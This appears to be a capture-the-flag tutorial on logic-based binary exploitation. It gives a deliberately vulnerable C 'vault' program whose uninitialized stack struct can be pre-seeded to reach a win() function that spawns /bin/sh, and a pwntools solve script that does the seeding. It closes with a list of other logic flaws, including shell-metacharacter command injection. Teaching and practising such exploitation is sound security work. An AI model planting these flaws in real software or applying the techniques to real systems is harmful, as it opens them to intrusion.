@@ -1,1 +1,120 @@
+Logic-based PWN and puzzle-style binaries differ from standard memory corruption attacks. Instead of relying on buffer overflows, format string bugs, or heap corruption, these challenges present a perfectly secure binary from a memory perspective (no unsafe functions, full protections like ASLR/Canaries enabled).
+Instead, the vulnerability lies entirely in the application logic—such as state machine bypasses, cryptographic implementation flaws, type confusion, race conditions, or unhandled edge cases.
+
+1. The Puzzle C Program (vault.c)
+
+This binary simulates a multi-stage authentication vault. It is completely immune to buffer overflows because it strictly limits input sizes via fgets. However, it contains a critical flaw: an uninitialized variable combined with a logic flaw in how state flags are evaluated.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+void win() {
+    printf("[+] Access Granted! Flag: FLAG{logic_flaws_bypass_all_mitigations}\n");
+    system("/bin/sh");
+}
+
+struct session_state {
+    char username[32];
+    int is_admin; // Logic flag: Must be exactly 1337 to open the vault
+};
+
+void login_stage() {
+    // VULNERABILITY: This structure is allocated on the stack but NOT initialized to zero!
+    // Its contents will inherit whatever residual data is sitting on the stack framework.
+    struct session_state current_session; 
+
+    printf("Enter username: ");
+    fgets(current_session.username, sizeof(current_session.username), stdin);
+    current_session.username[strcspn(current_session.username, "\n")] = 0;
+
+    // A normal login resets the admin flag to 0 safely
+    if (strcmp(current_session.username, "guest") == 0) {
+        current_session.is_admin = 0;
+        printf("[*] Logged in as Guest.\n");
+    } 
+    // Logic bypass condition
+    else if (current_session.is_admin == 1337) {
+        printf("[+] Administrative state detected via stack residency!\n");
+        win();
+    } else {
+        printf("[-] Access Denied. Normal users cannot access the vault.\n");
+    }
+}
+
+void configuration_stage() {
+    // This function sets up some unrelated configuration variables on the stack
+    int dummy_buffer[12];
+    printf("Enter setup code sequence (4 numbers):\n");
+    for(int i = 0; i < 4; i++) {
+        scanf("%d", &dummy_buffer[i]);
+    }
+    getchar(); // Clear newline
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    printf("=== SECURE VAULT v2.0 ===\n");
+    
+    // Step 1: Run setup
+    configuration_stage();
+    
+    // Step 2: Run login
+    login_stage();
+    
+    return 0;
+}
+Use code with caution.
+
+2. Solving the Logic Puzzle
+
+Because current_session in login_stage() is not initialized (e.g., using memset), it grabs a chunk of the stack frame previously used by configuration_stage().
+Functions reuse the same stack memory space when they are called sequentially. If we can map out exactly where dummy_buffer sits relative to where current_session.is_admin will land, we can "spray" or seed the stack memory with our target value (1337) ahead of time.
+
+The State Machine Lifecycle:
+
+1. configuration_stage() executes. We populate the stack array with 1337.
+2. configuration_stage() exits. The memory remains on the stack (stack frames are not cleared on exit, only the pointer moves).
+3. login_stage() executes and overlays its variables on the exact same memory region.
+4. current_session.is_admin reads the uninitialized space, finds the residual 1337, and automatically triggers win().
+
+3. The Python Exploit Script (solve_puzzle.py)
+
+Using pwntools, we script the multi-stage interaction required to pre-seed the stack before prompting the login script.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Start the puzzle binary process
+io = process('./vault')
+
+# Step 1: Interact with the configuration stage.
+# We send the magic logic value '1337' multiple times to guarantee we hit the 
+# residual memory offset that 'current_session.is_admin' will occupy.
+io.recvuntil(b"Enter setup code sequence (4 numbers):\n")
+log.info("Seeding stack memory with administrative validation codes...")
+
+io.sendline(b"1337")
+io.sendline(b"1337")
+io.sendline(b"1337")
+io.sendline(b"1337")
+
+# Step 2: Interact with the login stage.
+# We provide a random username that bypasses the explicit "guest" string match,
+# forcing the program to evaluate our pre-seeded stack variable condition.
+io.recvuntil(b"Enter username: ")
+log.info("Sending non-guest username to force uninitialized state evaluation...")
+io.sendline(b"attacker")
+
+# Check if our stack alignment puzzle resolved successfully
+response = io.recvall().decode()
+print(response)
+Use code with caution.
+
+4. Common Archetypes of Logic & Puzzle Binaries
+
+When dealing with binaries that have zero traditional memory corruption bugs, look for these architectural logic patterns:
+• Integer State Confusion: Forcing signed integers to act as array indices (e.g., passing -1 to read an array out-of-bounds backward into secret global variables).
+• Time-of-Check to Time-of-Use (TOCTOU): Creating a race condition where a file or state validation occurs, but an attacker modifies the underlying asset right before the function acts on it.
+• Command Injection via Sanitation Flaws: Tricking legal system calls (like system()) by passing shell metacharacters (;, &&, ||) inside input variables that developers forgot to escape.
 
